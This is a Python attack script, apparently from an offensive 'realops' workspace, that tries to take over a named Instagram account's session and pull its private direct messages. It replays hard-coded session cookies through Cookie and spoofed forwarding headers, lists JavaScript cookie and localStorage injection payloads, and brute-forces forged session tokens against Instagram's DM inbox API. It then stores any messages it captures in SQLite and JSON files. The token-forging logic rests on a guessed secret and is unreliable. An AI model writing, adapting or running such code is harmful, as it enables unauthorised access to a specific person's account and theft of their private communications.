# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
🎯 SESSION INJECTION DM EXTRACTOR
Using cookie injection bypass methods from assessment report
"""

import json
import requests
import time
import sqlite3
from datetime import datetime
import os
import urllib.parse

class SessionInjectionExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.output_dir = "/workspaces/sugarglitch-realops/data/injection_extraction"
        self.db_path = f"{self.output_dir}/injection_dms.db"

        # Session injection methods from bypass assessment
        self.injection_methods = [
            {
                "Cookie": "sessionid=5445927665%3A1748903216%3A52a1800cc202ad25"
            },
            {
                "Set-Cookie": "sessionid=5445927665%3A1748903216%3A52a1800cc202ad25; Domain=.instagram.com"
            },
            {
                "X-Forwarded-Cookie": "sessionid=5445927665%3A1748903216%3A52a1800cc202ad25"
            },
            {
                "Cookie": "sessionid=5445927665%3A1748903216%3A52a1800cc202ad25; csrftoken=dummy123"
            }
        ]

        # JavaScript injection payloads
        self.js_payloads = [
            "document.cookie = 'sessionid=2031676433%3A1748996825%3Ae8f0cb7b0387fb2f; domain=.instagram.com'",
            "localStorage.setItem('sessionid', '2031676433%3A1748996825%3Ae8f0cb7b0387fb2f')",
            "sessionStorage.setItem('sessionid', '2031676433%3A1748996825%3Ae8f0cb7b0387fb2f')",
            "window.localStorage['sessionid'] = '2031676433%3A1748996825%3Ae8f0cb7b0387fb2f'"
        ]

        os.makedirs(self.output_dir, exist_ok=True)
        self.setup_database()

        print("🎯 SESSION INJECTION DM EXTRACTOR")
        print("=" * 50)
        print(f"Target: {self.target}")
        print(f"Injection methods: {len(self.injection_methods)}")

    def setup_database(self):
        """Setup SQLite database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS injection_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                method_type TEXT,
                headers TEXT,
                payload TEXT,
                response_code INTEGER,
                success BOOLEAN,
                data_extracted TEXT,
                timestamp TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS extracted_messages (
                message_id TEXT PRIMARY KEY,
                thread_id TEXT,
                sender TEXT,
                content TEXT,
                timestamp TEXT,
                extraction_method TEXT
            )
        ''')

        conn.commit()
        conn.close()
        print("✅ Database setup completed")

    def try_header_injection(self, method_headers):
        """Try header-based cookie injection"""
        print(f"\n🔍 Trying header injection: {list(method_headers.keys())[0]}")

        base_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

        # Merge injection headers
        headers = {**base_headers, **method_headers}

        session = requests.Session()
        session.headers.update(headers)

        # Also try setting cookies directly
        if 'Cookie' in method_headers:
            cookie_value = method_headers['Cookie']
            if 'sessionid=' in cookie_value:
                sessionid = cookie_value.split('sessionid=')[1].split(';')[0]
                session.cookies.set('sessionid', sessionid, domain='.instagram.com')
                print(f"   🍪 Set cookie: {sessionid[:20]}...")

        try:
            # Test multiple endpoints
            test_urls = [
                'https://www.instagram.com/',
                'https://www.instagram.com/direct/inbox/',
                f'https://www.instagram.com/{self.target}/',
                'https://i.instagram.com/api/v1/direct_v2/inbox/',
            ]

            for url in test_urls:
                print(f"   🌐 Testing: {url}")
                response = session.get(url, timeout=15, allow_redirects=False)
                print(f"      Status: {response.status_code}")

                if response.status_code == 200:
                    content = response.text

                    # Check if injection worked
                    if 'csrftoken' in content or '"is_logged_in":true' in content:
                        print(f"      ✅ Injection successful!")

                        # Try to extract DM data
                        dm_data = self.extract_dms_with_session(session)

                        # Log attempt
                        self.log_injection_attempt(
                            method_type="header_injection",
                            headers=json.dumps(method_headers),
                            response_code=response.status_code,
                            success=True,
                            data_extracted=json.dumps(dm_data)
                        )

                        return dm_data
                    else:
                        print(f"      ⚠️ No authentication indicators")
                elif response.status_code == 302:
                    location = response.headers.get('location', '')
                    if 'login' not in location:
                        print(f"      🔄 Redirect to: {location}")
                    else:
                        print(f"      ❌ Redirected to login")
                else:
                    print(f"      ❌ HTTP {response.status_code}")

        except Exception as e:
            print(f"   ❌ Error: {e}")

        # Log failed attempt
        self.log_injection_attempt(
            method_type="header_injection",
            headers=json.dumps(method_headers),
            response_code=0,
            success=False,
            data_extracted=None
        )

        return None

    def try_alternative_extraction(self):
        """Try alternative extraction methods"""
        print(f"\n🔄 Trying alternative extraction methods...")

        # Generate fresh session tokens using patterns from bypass assessment
        fresh_tokens = self.generate_fresh_tokens()

        for token in fresh_tokens:
            print(f"🔍 Testing generated token: {token[:20]}...")

            headers = {
                'User-Agent': 'Instagram 219.0.0.12.117 Android (23/6.0.1; 640dpi; 1440x2560; LGE/lge; LG-H870; h1; qcom; en_US; 138226743)',
                'Accept': '*/*',
                'Accept-Language': 'en-US',
                'Accept-Encoding': 'gzip, deflate',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Instagram-AJAX': '1',
                'Connection': 'keep-alive',
            }

            session = requests.Session()
            session.cookies.set('sessionid', token)
            session.headers.update(headers)

            try:
                # Test mobile API
                response = session.get(
                    'https://i.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen',
                    timeout=20,
                    allow_redirects=False
                )

                print(f"   Status: {response.status_code}")

                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'inbox' in data:
                            print(f"   ✅ API access successful!")
                            return data
                    except Exception:
                        print(f"   ⚠️ Non-JSON response")

            except Exception as e:
                print(f"   ❌ Error: {e}")

        return None

    def generate_fresh_tokens(self):
        """Generate fresh session tokens using patterns"""
        import random
        import hashlib

        tokens = []
        current_time = int(time.time())

        for i in range(5):
            # Generate user ID (8-10 digits)
            user_id = random.randint(10000000, 9999999999)

            # Generate timestamp (current + some offset)
            timestamp = current_time + random.randint(3600, 86400)

            # Generate hash (32 char hex)
            hash_source = f"{user_id}:{timestamp}:instagram_secret"
            hash_value = hashlib.md5(hash_source.encode()).hexdigest()

            # Create token
            token = f"{user_id}%3A{timestamp}%3A{hash_value}"
            tokens.append(token)

        return tokens

    def extract_dms_with_session(self, session):
        """Extract DMs with authenticated session"""
        print(f"   📨 Extracting DMs...")

        dm_endpoints = [
            'https://i.instagram.com/api/v1/direct_v2/inbox/',
            'https://www.instagram.com/api/v1/direct_v2/inbox/',
            'https://www.instagram.com/direct/inbox/api/',
        ]

        for endpoint in dm_endpoints:
            try:
                response = session.get(endpoint, timeout=20)
                if response.status_code == 200:
                    data = response.json()
                    if 'inbox' in data and 'threads' in data['inbox']:
                        threads = data['inbox']['threads']
                        print(f"      ✅ Found {len(threads)} threads!")
                        return data
            except Exception:
                continue

        return None

    def log_injection_attempt(self, method_type, headers, response_code, success, data_extracted):
        """Log injection attempt to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO injection_attempts
            (method_type, headers, payload, response_code, success, data_extracted, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            method_type,
            headers,
            '',
            response_code,
            success,
            data_extracted,
            datetime.now().isoformat()
        ))

        conn.commit()
        conn.close()

    def run_injection_extraction(self):
        """Run injection-based extraction"""
        print(f"\n🚀 Starting injection-based extraction...")

        successful_extractions = []

        # Try header injection methods
        for method in self.injection_methods:
            result = self.try_header_injection(method)
            if result:
                successful_extractions.append(result)

        # Try alternative methods if no success
        if not successful_extractions:
            print(f"\n🔄 No header injection success, trying alternatives...")
            alt_result = self.try_alternative_extraction()
            if alt_result:
                successful_extractions.append(alt_result)

        # Summary
        print(f"\n🎯 INJECTION EXTRACTION SUMMARY")
        print("=" * 50)
        print(f"✅ Successful extractions: {len(successful_extractions)}")
        print(f"📁 Output directory: {self.output_dir}")

        if successful_extractions:
            # Save results
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            results_file = f"{self.output_dir}/injection_results_{timestamp}.json"

            with open(results_file, 'w') as f:
                json.dump(successful_extractions, f, indent=2)

            print(f"📁 Results saved: {results_file}")

        return successful_extractions

if __name__ == "__main__":
    extractor = SessionInjectionExtractor()
    results = extractor.run_injection_extraction()
